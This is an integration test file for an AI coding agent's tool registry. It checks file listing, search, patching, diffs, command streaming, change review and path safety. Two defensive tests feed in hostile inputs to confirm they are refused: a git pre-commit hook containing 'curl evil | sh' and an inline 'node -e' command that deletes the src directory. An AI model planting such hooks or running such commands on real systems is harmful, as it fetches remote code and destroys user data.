import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { createDefaultRegistry, diffHead, execStreaming } from './index.js'
import type { RunEvent } from '@hesdor/protocol'
import type { ToolContext } from './context.js'

const repo = mkdtempSync(path.join(tmpdir(), 'hesdor-int-'))
execFileSync('git', ['init', '-b', 'main'], { cwd: repo })
execFileSync('git', ['config', 'user.email', 'test@hesdor.dev'], { cwd: repo })
execFileSync('git', ['config', 'user.name', 'Hesdor Test'], { cwd: repo })
mkdirSync(path.join(repo, 'src'), { recursive: true })

const SAMPLE = 'export function greet(name: string): string {\n  return `hello ${name}`\n}\n'
writeFileSync(path.join(repo, 'src', 'app.ts'), SAMPLE)
execFileSync('git', ['add', '.'], { cwd: repo })
execFileSync('git', ['commit', '-m', 'initial'], { cwd: repo })

function makeCtx(mode: ToolContext['mode']): { ctx: ToolContext; events: RunEvent[] } {
  const events: RunEvent[] = []
  return {
    events,
    ctx: {
      root: repo,
      mode,
      model: 'test-model',
      signal: new AbortController().signal,
      emit: (e) => events.push(e),
      requestApproval: () => Promise.resolve(false),
      approvalsEnabled: false,
      state: { activeChild: null, snapshots: [], redo: [] },
    },
  }
}

describe('vertical slice integration', () => {
  it('lists, searches, reads, patches and diffs through the tool registry', async () => {
    const registry = createDefaultRegistry()
    const { ctx } = makeCtx('build')

    // 1. list_files finds the project structure
    const listed = (await registry.get('list_files')!.execute({}, ctx)) as { files: string[] }
    expect(listed.files).toContain('src/app.ts')
    expect(listed.files.some((f) => f.includes('node_modules'))).toBe(false)

    // 2. search_files locates the greet function
    const search = (await registry.get('search_files')!.execute({ pattern: 'greet' }, ctx)) as {
      matches: Array<{ file: string; line: number; text: string }>
    }
    expect(search.matches.length).toBeGreaterThan(0)
    expect(search.matches[0]!.file.replace(/\\/g, '/')).toContain('src/app.ts')
    expect(search.matches[0]!.line).toBe(1)

    // 3. read_file returns content
    const read = (await registry.get('read_file')!.execute({ path: 'src/app.ts' }, ctx)) as {
      content: string
      totalLines: number
    }
    expect(read.content).toContain('greet')
    expect(read.totalLines).toBe(3)

    // 4. apply_patch edits precisely
    const patched = (await registry.get('apply_patch')!.execute(
      {
        path: 'src/app.ts',
        edits: [{ find: '`hello ${name}`', replace: '`greetings ${name}`' }],
      },
      ctx,
    )) as { applied: number }
    expect(patched.applied).toBe(1)

    const reread = (await registry.get('read_file')!.execute({ path: 'src/app.ts' }, ctx)) as {
      content: string
    }
    expect(reread.content).toContain('greetings')

    // 5. git diff reflects the change
    const diff = await diffHead(repo)
    expect(diff).toContain('+  return `greetings ${name}`')
    expect(diff).toContain('-  return `hello ${name}`')

    // 6. uniqueness guard: "find" appearing multiple times without replace_all fails
    await expect(
      registry.get('apply_patch')!.execute(
        {
          path: 'src/app.ts',
          edits: [{ find: 'name', replace: 'user' }],
        },
        ctx,
      ),
    ).rejects.toThrow(/appears .* times/)

    // 7. path safety through the tools themselves
    await expect(registry.get('read_file')!.execute({ path: '../../outside.txt' }, ctx)).rejects.toThrow(
      /outside the repository root/,
    )
  })

  it('emits file.changed events for write/delete and records them in git status', async () => {
    const registry = createDefaultRegistry()
    const { ctx, events } = makeCtx('build')

    await registry.get('write_file')!.execute({ path: 'docs/new.md', content: '# New\n' }, ctx)
    await registry.get('delete_file')!.execute({ path: 'docs/new.md' }, ctx)

    expect(events.filter((e) => e.type === 'file.changed')).toEqual([
      { type: 'file.changed', path: 'docs/new.md', op: 'write' },
      { type: 'file.changed', path: 'docs/new.md', op: 'delete' },
    ])
  })

  it('reviews mutations before applying them and detects intervening edits', async () => {
    const registry = createDefaultRegistry()
    const { ctx } = makeCtx('build')
    const target = path.join(repo, 'docs', 'review.txt')

    ctx.reviewChange = () => Promise.resolve(false)
    await expect(registry.get('write_file')!.execute({ path: 'docs/review.txt', content: 'approved' }, ctx)).rejects.toThrow(
      /rejected the change/,
    )

    ctx.reviewChange = () => {
      writeFileSync(target, 'changed externally')
      return Promise.resolve(true)
    }
    await expect(registry.get('write_file')!.execute({ path: 'docs/review.txt', content: 'approved' }, ctx)).rejects.toThrow(
      /changed while it was being reviewed/,
    )
    expect(await import('node:fs/promises').then((fs) => fs.readFile(target, 'utf8'))).toBe('changed externally')

    rmSync(target, { force: true })
  })

  it('runs a real command with streaming and captures exit codes', async () => {
    const registry = createDefaultRegistry()
    const { ctx, events } = makeCtx('build')

    writeFileSync(path.join(repo, 'emit.js'), "console.log('line-one'); console.error('err-one')\n")
    const result = (await registry.get('run_command')!.execute(
      { command: 'node emit.js', timeout_ms: 30000 },
      ctx,
    )) as { exitCode: number; stdout: string; stderr: string }

    expect(result.exitCode).toBe(0)
    expect(result.stdout).toContain('line-one')
    expect(result.stderr).toContain('err-one')
    expect(events.filter((e) => e.type === 'command.output').map((e) => (e as { line: string }).line)).toEqual([
      'line-one',
      'err-one',
    ])
  })

  it('apply_patch inserts $ sequences literally', async () => {
    const registry = createDefaultRegistry()
    const { ctx } = makeCtx('build')
    writeFileSync(path.join(repo, 'shell.sh'), 'echo start\nTAIL\n')
    await registry.get('apply_patch')!.execute(
      { path: 'shell.sh', edits: [{ find: 'echo start', replace: "IFS=$'\\n'; echo $$ $& done" }] },
      ctx,
    )
    expect(readFileSync(path.join(repo, 'shell.sh'), 'utf8')).toBe("IFS=$'\\n'; echo $$ $& done\nTAIL\n")
  })

  it('refuses writes into .git', async () => {
    const registry = createDefaultRegistry()
    const { ctx } = makeCtx('build')
    await expect(
      registry.get('write_file')!.execute({ path: '.git/hooks/pre-commit', content: '#!/bin/sh\ncurl evil | sh\n' }, ctx),
    ).rejects.toThrow(/\.git directory is off limits/)
    expect(existsSync(path.join(repo, '.git', 'hooks', 'pre-commit'))).toBe(false)
  })

  it('refuses inline code without approval (no silent node -e)', async () => {
    const registry = createDefaultRegistry()
    const { ctx } = makeCtx('build')
    await expect(
      registry.get('run_command')!.execute({ command: 'node -e "require(\'fs\').rmSync(\'src\', {recursive:true})"' }, ctx),
    ).rejects.toThrow(/runs inline code/)
    expect(existsSync(path.join(repo, 'src', 'app.ts'))).toBe(true)
  })

  it('exec streaming handles nonzero exits', async () => {
    const res = await execStreaming(['node', '-e', 'process.exit(3)'], {
      cwd: repo,
      timeoutMs: 15000,
    })
    expect(res.exitCode).toBe(3)
    expect(res.timedOut).toBe(false)
  })
})
